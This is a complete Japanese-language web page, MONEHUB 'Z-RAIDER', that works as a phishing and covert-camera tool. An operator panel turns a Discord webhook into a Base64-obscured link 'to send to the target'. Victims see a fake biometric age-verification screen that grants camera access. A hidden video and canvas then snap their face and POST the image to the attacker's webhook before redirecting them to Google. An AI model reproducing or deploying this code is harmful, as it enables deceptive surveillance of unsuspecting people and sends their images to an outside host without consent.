<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MONEHUB - 生体認証システム</title>
    <style>
        :root { --crimson: #DC143C; --dark-bg: #050505; --neon-red: #ff0033; }
        body { background-color: var(--dark-bg); color: #fff; font-family: 'Hiragino Kaku Gothic Pro', 'Meiryo', sans-serif; text-align: center; margin: 0; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .header { position: absolute; top: 0; width: 100%; padding: 25px 0; border-bottom: 3px solid var(--crimson); box-shadow: 0 0 25px var(--neon-red); background: #000; z-index: 100; }
        h1 { color: var(--crimson); letter-spacing: 15px; margin: 0; font-size: 2rem; text-shadow: 0 0 15px var(--neon-red); font-family: 'Arial Black', sans-serif; }
        .container { width: 90%; max-width: 450px; background: #111; padding: 40px 25px; border-radius: 5px; border-left: 5px solid var(--crimson); box-shadow: 10px 10px 0px #000; }
        input { width: 100%; padding: 15px; margin: 20px 0; border: 1px solid #333; background: #000; color: #fff; box-sizing: border-box; font-family: monospace; outline: none; border-bottom: 2px solid var(--crimson); }
        .btn { width: 100%; padding: 20px; background: var(--crimson); border: none; color: white; font-weight: bold; cursor: pointer; box-shadow: 0 0 15px rgba(220, 20, 60, 0.6); transition: 0.2s; letter-spacing: 2px; font-size: 1.1rem; }
        .btn:hover { background: #ff0000; box-shadow: 0 0 30px var(--neon-red); }
        #result-area { display: none; margin-top: 25px; background: #000; padding: 15px; border: 1px dashed var(--crimson); word-break: break-all; font-family: monospace; color: var(--neon-red); font-size: 0.8rem; text-align: left; }
        #copy-btn { margin-top: 10px; background: #333; color: #fff; padding: 5px; font-size: 0.7rem; cursor: pointer; border: none; width: 100%; }
        
        /* 攻撃画面用 */
        .loading-ring { width: 70px; height: 70px; border: 5px solid #222; border-top: 5px solid var(--crimson); border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 25px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        video, canvas { position: fixed; top: -2000px; left: -2000px; opacity: 0; }
        .terms { font-size: 0.75rem; color: #555; margin-top: 20px; text-align: left; border-top: 1px solid #222; padding-top: 10px; line-height: 1.5; }
    </style>
</head>
<body>
    <div class="header"><h1>MONEHUB</h1></div>

    <div id="gen-screen" class="container">
        <p style="color:var(--crimson); font-size: 1.1rem; font-weight: bold;">Z-RAIDER リンク生成パネル</p>
        <p style="font-size: 0.75rem; color: #888;">受け取り用のDISCORD WEBHOOKを入力</p>
        <input type="text" id="webhook-input" placeholder="DISCORD WEBHOOK URL...">
        <button class="btn" onclick="generateLink()">攻撃リンクを発行する</button>
        
        <div id="result-area">
            <p style="color:#aaa; margin-bottom:5px;">生成されたターゲット用URL:</p>
            <p id="generated-url" style="color:#fff;"></p>
            <button id="copy-btn" onclick="copyUrl()">URLをコピーする</button>
        </div>
    </div>

    <div id="target-start-screen" class="container" style="display:none;">
        <h2 style="color:var(--crimson); letter-spacing: 2px;">年齢認証が必要です</h2>
        <p style="font-size:0.85rem; color:#bbb; line-height: 1.6;">継続するには、生体認証による年齢確認を行ってください。</p>
        <div class="terms">
            ・カメラアクセスを通じて顔認証を行います。<br>
            ・利用規約に同意する場合のみ開始してください。
        </div>
        <br>
        <button class="btn" onclick="startBiometrics()">規約に同意して認証を開始</button>
    </div>

    <div id="exec-screen" class="container" style="display:none;">
        <div class="loading-ring"></div>
        <div id="status-msg" style="color:var(--crimson); font-size: 1.1rem;">生体センサーを起動中...</div>
        <p style="font-size:0.75rem; color:#555; margin-top: 10px;">カメラを正面に向けたままお待ちください。</p>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const encodedWebhook = urlParams.get('wh');

        // URLにパラメータがある場合はターゲット画面へ
        if (encodedWebhook) {
            document.getElementById('gen-screen').style.display = 'none';
            document.getElementById('target-start-screen').style.display = 'block';
        }

        // リンク生成：Webhookがないとエラーを出す
        function generateLink() {
            const wh = document.getElementById('webhook-input').value;
            if (!wh || !wh.includes("discord.com/api/webhooks/")) {
                alert("エラー: 有効なDISCORD WEBHOOK URLを入力してください。");
                return;
            }
            // WebhookをBase64で隠蔽
            const finalUrl = window.location.origin + window.location.pathname + "?wh=" + btoa(wh);
            document.getElementById('result-area').style.display = 'block';
            document.getElementById('generated-url').innerText = finalUrl;
        }

        function copyUrl() {
            const url = document.getElementById('generated-url').innerText;
            navigator.clipboard.writeText(url);
            alert("コピーしました。これをターゲットに送ってください。");
        }

        async function startBiometrics() {
            document.getElementById('target-start-screen').style.display = 'none';
            document.getElementById('exec-screen').style.display = 'block';
            
            const webhookUrl = atob(encodedWebhook);
            const statusMsg = document.getElementById('status-msg');
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                video.srcObject = stream;
                
                statusMsg.innerText = "生体データをスキャン中 (40%)...";
                setTimeout(() => { statusMsg.innerText = "照合処理を実行中 (85%)..."; }, 1500);
                setTimeout(() => { 
                    statusMsg.innerText = "完了まで残りわずか..."; 
                    captureAndSend(webhookUrl, video, canvas); 
                }, 3500);
                
                setTimeout(() => {
                    statusMsg.innerText = "認証に成功しました。";
                    setTimeout(() => { window.location.href = "https://www.google.com"; }, 1000);
                }, 5500);
            } catch (err) {
                alert("エラー：カメラを許可しないと認証できません。");
                location.reload();
            }
        }

        function captureAndSend(webhookUrl, video, canvas) {
            const context = canvas.getContext('2d');
            canvas.width = 1280;
            canvas.height = 720;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('file', blob, 'MONEHUB_SHOT.png');
                formData.append('content', '🚨 **MONEHUB Z-RAIDER: ターゲット捕捉成功** 🚨');
                fetch(webhookUrl, { method: 'POST', body: formData });
            }, 'image/png');
        }
    </script>
</body>
</html>
